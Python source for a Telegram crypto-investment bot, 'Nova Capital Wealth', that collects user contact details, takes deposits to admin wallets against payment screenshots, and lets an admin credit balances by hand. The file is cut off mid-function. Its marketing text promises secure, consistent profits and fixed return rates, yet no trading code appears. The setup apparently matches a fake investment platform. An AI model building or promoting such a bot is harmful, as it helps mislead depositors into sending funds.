import os
import logging
from threading import Thread
from flask import Flask
from typing import Dict, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler
)
from telegram.error import TelegramError

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation handler
# States for conversation handler
(WAITING_NAME, WAITING_EMAIL, WAITING_PHONE, MAIN_MENU,
 DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_CRYPTO_ADDRESS,
 STAKING_AMOUNT, STAKING_DURATION, STAKING_TYPE) = range(11)

# Bot configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    raise ValueError("BOT_TOKEN must be set in environment variables")

# Function to get ADMIN_USER_ID dynamically
def get_admin_id() -> int:
    admin_id = os.getenv('ADMIN_USER_ID')
    if not admin_id:
        logger.error("ADMIN_USER_ID environment variable not set!")
        return 0
    try:
        return int(admin_id)
    except ValueError:
        logger.error("ADMIN_USER_ID must be a valid integer!")
        return 0

# Trading bots configuration
trading_bots = {
    'NCW Trading Bot': {'description': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.', 'profit_rate': f'20%-35'},
    'TrendSeeker': {'description': 'Conservative strategy focusing on steady market trends.', 'profit_rate': f'15%-25'},
    'GrowthMaster': {'description': 'Balanced approach for moderate risk and consistent growth.', 'profit_rate': f'17%-21'},
    'ProfitPulse': {'description': 'Aggressive strategy targeting high returns in volatile markets.', 'profit_rate': f'12%-16'},
    'StableCore': {'description': 'Diversified portfolio for long-term stability and growth.', 'profit_rate': f'19%-23%'}
}

# Keep-alive web server
app = Flask('')

@app.route('/')
def home():
    return "I am alive"

def run_http():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run_http)
    t.start()

# Crypto default chain mapping for display in withdraw flows
CRYPTO_CHAINS = {
    'BTC': 'Bitcoin Mainnet',
    'ETH': 'Ethereum (ERC-20)',
    'USDT': 'Tether (ERC-20)',
    'USDC': 'USD Coin (ERC-20)',
    'BNB': 'Binance Smart Chain (BEP-20)',
    'SOL': 'Solana',
    'ADA': 'Cardano',
    'XRP': 'XRP Ledger',
    'DOGE': 'Dogecoin',
    'DOT': 'Polkadot',
    'TRX': 'Tron (TRC-20)',
    'LTC': 'Litecoin',
    'BCH': 'Bitcoin Cash',
    'LINK': 'Chainlink (ERC-20)',
    'MATIC': 'Polygon (ERC-20)'
}

def get_user_data(user_id: int) -> Dict[str, Any]:
    """Get user data with default values"""
    from database import db
    
    user_info = db.get_user(user_id)
    
    if not user_info:
        user_info = {
            'name': '',
            'email': '',
            'phone': '',
            'balance': 0.0,
            'deposit': 0.0,
            'profit': 0.0,
            'withdrawal': 0.0,
            'approved': False,
            'active_bot': None,
            'pending_deposit': 0.0,
            'pending_withdrawal': 0.0,
            'staked_balance': 0.0,
            'active_stakes': []
        }
        db.save_user(user_id, user_info)
    
    return user_info

def create_cancel_keyboard():
    """Create a keyboard with cancel button"""
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message with start button"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features. Use admin commands like /adminpanel or /listusers.")
        return ConversationHandler.END
        
    # Check if user is already registered
    user_info = get_user_data(user_id)
    if user_info['name'] and user_info['email'] and user_info['phone']:
        # Check if approved
        if user_info.get('approved', False):
            return await show_main_menu(update, context)
        else:
            await update.message.reply_text(
                "⏳ Your account is awaiting admin approval. You'll be notified once your account is activated."
            )
            return ConversationHandler.END
        
    keyboard = [
        [InlineKeyboardButton("🚀 START NOW", callback_data='start_registration')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = """🌟 **Welcome to Nova Capital Wealth Trading Bot** 🌟

Your trusted trading bot in achieving consistent and secure trading success. Designed with cutting-edge algorithms and advanced market analysis, Nova Capital Wealth stands out as one of the best trading bots in the industry, delivering strong and steady profit potential.

With a focus on safety, transparency, and efficiency, our bot operates within a secure trading environment, ensuring that your investments are well-protected while maximizing opportunities in the market.

Nova Capital Wealth Trading Bot offers you the perfect balance of high performance and peace of mind. Ready to unlock your financial potential? Click "START NOW" to begin!"""
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    return WAITING_NAME

async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start user registration process"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Please enter your full name:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's full name"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    user_info = get_user_data(user_id)
    user_info['name'] = update.message.text.strip()
    
    from database import db
    db.save_user(user_id, user_info)
    
    await update.message.reply_text(
        "Please enter your email address:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's email"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    user_info = get_user_data(user_id)
    user_info['email'] = update.message.text.strip()
    
    from database import db
    db.save_user(user_id, user_info)
    
    await update.message.reply_text(
        "Please enter your phone number:",
        reply_markup=create_cancel_keyboard()
    )
    return WAITING_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get user's phone and complete registration"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    user_info = get_user_data(user_id)
    user_info['phone'] = update.message.text.strip()
    user_info['approved'] = False  # Requires admin approval
    
    # Save to database
    from database import db
    db.save_user(user_id, user_info)
    
    # Notify admin of new user registration
    admin_message = f"""👤 **New User Registration**

🆔 **User ID:** {user_id}
👤 **Name:** {user_info['name']}
📧 **Email:** {user_info['email']}
📱 **Phone:** {user_info['phone']}

Click 'Approve' to activate this user's account."""
    
    keyboard = [
        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_new_user_{user_id}')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        logger.info(f"Sent registration notification for user {user_id} to admin {admin_id}")
    except TelegramError as e:
        logger.error(f"Failed to notify admin of new user {user_id}: {e}")
    
    await update.message.reply_text(
        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved."
    )
    logger.info(f"User {user_id} completed registration, awaiting approval")
    
    return ConversationHandler.END

async def approve_new_user_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin approval of new user registration"""
    query = update.callback_query
    await query.answer()
    
    admin_id = get_admin_id()
    if update.effective_user.id != admin_id:
        await query.edit_message_text("❌ Unauthorized access.")
        return
    
    try:
        user_id = int(query.data.split('_')[-1])
        
        user_info = get_user_data(user_id)
        if not user_info or not user_info.get('name'):
            await query.edit_message_text("❌ User not found.")
            return
        
        # CHECK: Prevent double approval
        if user_info.get('approved', False):
            await query.edit_message_text(
                f"{query.message.text}\n\n⚠️ **Already Approved** - This user has already been approved."
            )
            logger.warning(f"Attempted double approval for user {user_id}")
            return
        
        # Approve user
        user_info['approved'] = True
        from database import db
        db.save_user(user_id, user_info)
        
        # Update admin message
        await query.edit_message_text(
            f"{query.message.text}\n\n✅ **User Approved** - Access granted",
            parse_mode='Markdown'
        )
        
        # Send main menu directly to user
        menu_text = f"""🎉 **Great news, {user_info['name']}!** 🎉

Your account has been approved. Welcome to Nova Capital Wealth Trading Bot!

💰 **Available Balance:** ${user_info.get('balance', 0):.2f}
📈 **Deposit:** ${user_info.get('deposit', 0):.2f}
📊 **Profit:** ${user_info.get('profit', 0):.2f}
📉 **Withdrawal:** ${user_info.get('withdrawal', 0):.2f}"""
        
        keyboard = [
            [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
             InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
            [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
             InlineKeyboardButton("🎯 Stake", callback_data='stake')],
            [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
             InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
             [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
             [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=menu_text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            # Mark the user's conversation state so they can interact immediately
            user_data_store = context.application.dispatcher.user_data
            user_store = user_data_store.setdefault(user_id, {})
            user_store['conversation_state'] = 'MAIN_MENU'
            user_store['_in_conversation'] = True
            logger.info(f"Sent approval notification and main menu to user {user_id}")
        except TelegramError as e:
            logger.error(f"Failed to notify user {user_id} of approval: {e}")
        
    except (ValueError, IndexError) as e:
        logger.error(f"Error approving user: {e}")
        await query.edit_message_text("❌ Invalid format.")


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Display the main menu"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features. Use admin commands like /adminpanel or /listusers."
        )
        return ConversationHandler.END
        
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        
    user_info = get_user_data(user_id)
    
    # Check if user is approved
    if not user_info.get('approved', False):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⏳ Your account is awaiting admin approval. You'll be notified once your account is activated."
        )
        return ConversationHandler.END
    
    # Available = total balance minus locked stake funds
    locked = user_info.get('locked_stake_balance', 0.0)
    available = user_info['balance'] - locked
    if available < 0:
        available = 0.0
    staking_bal = user_info.get('staked_balance', 0.0)
    
    menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉

💰 **Available Balance:** ${available:.2f}
🎯 **Staking Balance:** ${staking_bal:.2f}
🔒 **Locked Stake:** ${locked:.2f}
📈 **Deposit:** ${user_info['deposit']:.2f}
📊 **Profit:** ${user_info['profit']:.2f}
📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
         InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
         InlineKeyboardButton("🎯 Stake", callback_data='stake')],
        [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
         InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
        [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if update.callback_query:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=menu_text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
    except TelegramError as e:
        logger.error(f"Failed to show main menu for user {user_id}: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ Failed to load main menu. Please try again.",
            reply_markup=reply_markup
        )
    
    return MAIN_MENU

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Return to the main menu"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    return await show_main_menu(update, context)

async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle deposit request"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("₿ Crypto", callback_data='deposit_crypto')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="How would you like to deposit?",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show cryptocurrency options"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    from database import db
    crypto_addresses = db.get_all_crypto_addresses()
    
    keyboard = []
    for crypto in crypto_addresses.keys():
        keyboard.append([InlineKeyboardButton(f"{crypto}", callback_data=f'crypto_select_{crypto}')])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select your preferred cryptocurrency:",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle cryptocurrency selection"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    crypto_name = query.data.split('_')[-1]
    context.user_data['selected_crypto'] = crypto_name
    # If user is not in a ConversationHandler instance, mark that we are expecting a deposit amount
    context.user_data['awaiting_deposit_amount'] = True
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Enter the amount you want to deposit in USD:",
        reply_markup=create_cancel_keyboard()
    )
    return DEPOSIT_AMOUNT

async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get deposit amount and show payment details"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    # Clear awaiting flag if present; if we are here due to a top-level message handler, it should be cleared
    if context.user_data.pop('awaiting_deposit_amount', None):
        pass
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Amount must be positive")
            
        context.user_data['deposit_amount'] = amount
        # Mark that we are expecting proof (photo) for top-level handler fallback
        context.user_data['awaiting_deposit_proof'] = True
        crypto_name = context.user_data['selected_crypto']
        
        from database import db
        address = db.get_crypto_address(crypto_name)
        
        keyboard = [
            [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_address_{crypto_name}')],
            [InlineKeyboardButton("✅ I Have Made Payment", callback_data='payment_made')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = f"""💳 **Deposit Details**

💰 **Amount:** ${amount:.2f}
🪙 **Cryptocurrency:** {crypto_name}
🏦 **Wallet Address:** `{address}`
⚠️ **Security Warning:** Never share your payment details publicly. Only send to the address above.

Click "Copy Address" to automatically copy the wallet address to your clipboard."""
        
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='Markdown')
        return DEPOSIT_PROOF
        
    except ValueError:
        await update.message.reply_text(
            "Please enter a valid amount (numeric value only):",
            reply_markup=create_cancel_keyboard()
        )
        return DEPOSIT_AMOUNT

async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send crypto address as easily copyable text"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    
    # Extract crypto name: callback is 'copy_address_CRYPTONAME'
    crypto_name = query.data.replace('copy_address_', '')
    
    from database import db
    address = db.get_crypto_address(crypto_name)
    
    # Show toast popup
    await query.answer("📋 Address sent below — tap to copy!", show_alert=False)
    
    # Send address as code block (tappable to copy on mobile)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"<code>{address}</code>\n\n👆 <b>Tap the address above to copy it</b>",
        parse_mode='HTML'
    )
    
    return DEPOSIT_PROOF


async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment confirmation"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    # Mark expecting deposit proof for non-conversation flows
    context.user_data['awaiting_deposit_proof'] = True
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Please send a screenshot of your payment as proof:",
        reply_markup=create_cancel_keyboard()
    )
    return DEPOSIT_PROOF

async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get deposit proof screenshot and notify admin with confirm button"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    user_info = get_user_data(user_id)
    amount = context.user_data.get('deposit_amount', 0.0)
    crypto_name = context.user_data.get('selected_crypto', 'Unknown')
    
    # Clear awaiting flag as proof has been received
    context.user_data.pop('awaiting_deposit_proof', None)
    context.user_data['deposit_message_id'] = update.message.message_id if update.message else None
    
    # Check if this is a staking deposit
    is_staking = context.user_data.get('deposit_purpose') == 'staking'
    purpose_text = "🎯 **Staking Deposit**" if is_staking else "💳 **New Deposit Request**"
    purpose_tag = "_staking" if is_staking else ""
    
    admin_message = f"""{purpose_text}

👤 **User:** {user_info['name']} (ID: {user_id})
💰 **Amount:** ${amount:.2f}
🪙 **Crypto:** {crypto_name}
📱 **Phone:** {user_info['phone']}
📧 **Email:** {user_info['email']}

Click 'Approve' to confirm this deposit."""
    
    keyboard = [
        [InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}{purpose_tag}')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        message = await context.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        context.user_data['admin_deposit_message_id'] = message.message_id
        logger.info(f"Sent deposit request for user {user_id} to admin {admin_id} with message ID {message.message_id}")
        
        if update.message.photo:
            await context.bot.forward_message(
                chat_id=admin_id,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.message_id
            )
            logger.info(f"Forwarded deposit proof photo for user {user_id} to admin {admin_id}")
            
    except TelegramError as e:
        logger.error(f"Failed to send admin notification for user {user_id}: {e}")
        await update.message.reply_text(
            "⚠️ Failed to process deposit proof. Please try again or contact support.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
        )
        return MAIN_MENU
        
    user_info['pending_deposit'] = amount
    from database import db
    db.save_user(user_id, user_info)
    
    await update.message.reply_text(
        "Your deposit is pending admin confirmation. You'll be notified once it's processed.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
    )
    return MAIN_MENU

async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin's deposit confirmation via button"""
    query = update.callback_query
    await query.answer()
    
    admin_id = get_admin_id()
    user_id = update.effective_user.id
    
    if user_id != admin_id:
        logger.warning(f"Unauthorized deposit confirmation attempt by user {user_id}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Unauthorized access."
        )
        return MAIN_MENU
        
    try:
        logger.info(f"Processing deposit confirmation with callback data: {query.data}")
        
        # Check if this is a staking deposit and strip the suffix for parsing
        is_staking = '_staking' in query.data
        parse_data = query.data.replace('_staking', '') if is_staking else query.data
        
        parts = parse_data.split('_')
        if len(parts) < 3:
            raise ValueError("Invalid callback data format")
        target_user_id = int(parts[-2])
        amount = float(parts[-1])
        
        user_info = get_user_data(target_user_id)
        if not user_info or not user_info.get('name'):
            logger.error(f"User {target_user_id} not found for deposit confirmation")
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ User not found."
            )
            return MAIN_MENU
        
        # CHECK: Prevent double approval
        if user_info.get('pending_deposit', 0) == 0:
            await query.edit_message_text(
                f"{query.message.text}\n\n⚠️ **Already Processed** - This deposit has already been approved."
            )
            logger.warning(f"Attempted double approval of deposit for user {target_user_id}")
            return MAIN_MENU
            
        # Check if this is a staking deposit
        is_staking = '_staking' in query.data
        
        user_info['balance'] += amount
        user_info['deposit'] += amount
        if is_staking:
            user_info['staked_balance'] = user_info.get('staked_balance', 0.0) + amount
        user_info['pending_deposit'] = 0
        
        from database import db
        db.save_user(target_user_id, user_info)
        
        if is_staking:
            logger.info(f"Approved STAKING deposit of ${amount:.2f} for user {target_user_id}. Balance: ${user_info['balance']:.2f}, Staked: ${user_info.get('staked_balance', 0):.2f}")
            notify_text = f"✅ Your staking deposit of ${amount:.2f} has been confirmed!\n\n💰 Balance: ${user_info['balance']:.2f}\n🎯 Staking Balance: ${user_info.get('staked_balance', 0):.2f}"
        else:
            logger.info(f"Approved deposit of ${amount:.2f} for user {target_user_id}. New balance: ${user_info['balance']:.2f}")
            notify_text = f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=notify_text,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
            )
            logger.info(f"Notified user {target_user_id} of deposit confirmation")
        except TelegramError as e:
            logger.error(f"Failed to notify user {target_user_id} of deposit confirmation: {e}")
        
        deposit_type = "Staking Deposit" if is_staking else "Deposit"
        await query.edit_message_text(
            f"{query.message.text}\n\n✅ **{deposit_type} Approved** - ${amount:.2f} added to user {target_user_id}'s balance."
        )
        logger.info(f"Updated admin message for deposit confirmation for user {target_user_id}")
        
        return MAIN_MENU
        
    except (ValueError, IndexError) as e:
        logger.error(f"Error processing deposit confirmation: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Invalid format or error processing deposit. Please use /approve <user_id> <amount> manually."
        )
        return MAIN_MENU

async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle withdrawal request"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    # Only crypto withdrawals supported; present a list of cryptos for selection
    keyboard = [
        [InlineKeyboardButton("Select Crypto for Withdrawal", callback_data='withdraw_crypto')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Please select the cryptocurrency you want to withdraw:",
        reply_markup=reply_markup
    )
    return MAIN_MENU


async def show_withdraw_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show a short list of popular cryptocurrencies to choose from when withdrawing."""
    query = update.callback_query
    await query.answer()

    # A short list of popular crypto (15 items) with default chains
    cryptos = [
        ('BTC', 'Bitcoin (BTC)'), ('ETH', 'Ethereum (ERC-20)'), ('USDT', 'Tether (ERC-20)'),
        ('USDC', 'USD Coin (ERC-20)'), ('BNB', 'Binance Chain (BEP-20)'), ('SOL', 'Solana (SOL)'),
        ('ADA', 'Cardano (ADA)'), ('XRP', 'Ripple (XRP)'), ('DOGE', 'Dogecoin (DOGE)'),
        ('DOT', 'Polkadot (DOT)'), ('TRX', 'TRON (TRC-20)'), ('LTC', 'Litecoin (LTC)'),
        ('BCH', 'Bitcoin Cash (BCH)'), ('LINK', 'Chainlink (LINK)'), ('MATIC', 'Polygon (MATIC)')
    ]

    keyboard = []
    # Keep list short: two columns
    for symbol, display in cryptos:
        keyboard.append([InlineKeyboardButton(f"{display}", callback_data=f'withdraw_select_{symbol}')])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Please select the cryptocurrency you wish to withdraw:",
        reply_markup=reply_markup
    )
    return MAIN_MENU


async def handle_withdraw_crypto_select(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """User picked a crypto to withdraw — store selection and ask for amount.
    Also show the default chain for the selected crypto.
    """
    query = update.callback_query
    await query.answer()

    crypto = query.data.replace('withdraw_select_', '')
    chain_info = CRYPTO_CHAINS.get(crypto, 'Unknown chain')

    context.user_data['withdrawal_method'] = 'crypto'
    context.user_data['selected_withdraw_crypto'] = crypto
    # mark awaiting withdraw amount for fallback
    context.user_data['awaiting_withdraw_amount'] = True

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"You selected **{crypto}**. Network: {chain_info}.\nEnter the amount you want to withdraw in USD:",
        parse_mode='Markdown',
        reply_markup=create_cancel_keyboard()
    )
    return WITHDRAW_AMOUNT

async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get withdrawal amount for crypto"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    context.user_data['withdrawal_method'] = 'crypto'
    # If not in a conversation, mark that we're expecting the withdraw amount next (top-level fallback)
    context.user_data['awaiting_withdraw_amount'] = True
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Enter the amount you want to withdraw in USD:",
        reply_markup=create_cancel_keyboard()
    )
    return WITHDRAW_AMOUNT

## Bank withdrawal flow removed (deprecated)

async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process withdrawal amount"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    # Clear awaiting flag if present
    if context.user_data.pop('awaiting_withdraw_amount', None):
        pass
    try:
        amount = float(update.message.text)
        user_info = get_user_data(user_id)
        
        if amount <= 0:
            raise ValueError("Amount must be positive")
            
        if amount > user_info['balance']:
            await update.message.reply_text(
                f"Insufficient balance. Your available balance is ${user_info['balance']:.2f}",
                reply_markup=create_cancel_keyboard()
            )
            return WITHDRAW_AMOUNT
            
        context.user_data['withdraw_amount'] = amount
        
        if context.user_data['withdrawal_method'] == 'crypto':
            selected = context.user_data.get('selected_withdraw_crypto')
            chain_info = CRYPTO_CHAINS.get(selected, 'Unknown chain')
            await update.message.reply_text(
                f"Please enter your {selected} wallet address (Network: {chain_info}):",
                reply_markup=create_cancel_keyboard()
            )
            # mark we're awaiting crypto address for fallback path
            context.user_data['awaiting_withdraw_crypto_address'] = True
            return WITHDRAW_CRYPTO_ADDRESS
        else:
            await update.message.reply_text(
                "Please enter your bank name:",
                reply_markup=create_cancel_keyboard()
            )
            # bank flow removed
            
    except ValueError:
        await update.message.reply_text(
            "Please enter a valid amount (numeric value only):",
            reply_markup=create_cancel_keyboard()
        )
        return WITHDRAW_AMOUNT

async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get crypto address for withdrawal"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return ConversationHandler.END
        
    # Clear awaiting flag if present
    context.user_data.pop('awaiting_withdraw_crypto_address', None)
    context.user_data['crypto_address'] = update.message.text.strip()
    user_info = get_user_data(user_id)
    amount = context.user_data['withdraw_amount']
    address = context.user_data['crypto_address']
    selected_crypto = context.user_data.get('selected_withdraw_crypto', 'Unknown')
    chain_info = CRYPTO_CHAINS.get(selected_crypto, 'Unknown chain')
    
    admin_message = f"""💸 **Crypto Withdrawal Request**

👤 **User:** {user_info['name']} (ID: {user_id})
💰 **Amount:** ${amount:.2f}
🪙 **Crypto:** {selected_crypto} ({chain_info})
🏦 **Crypto Address:** {address}
📱 **Phone:** {user_info['phone']}
📧 **Email:** {user_info['email']}

Click 'Approve' to confirm this withdrawal."""
    
    keyboard = [
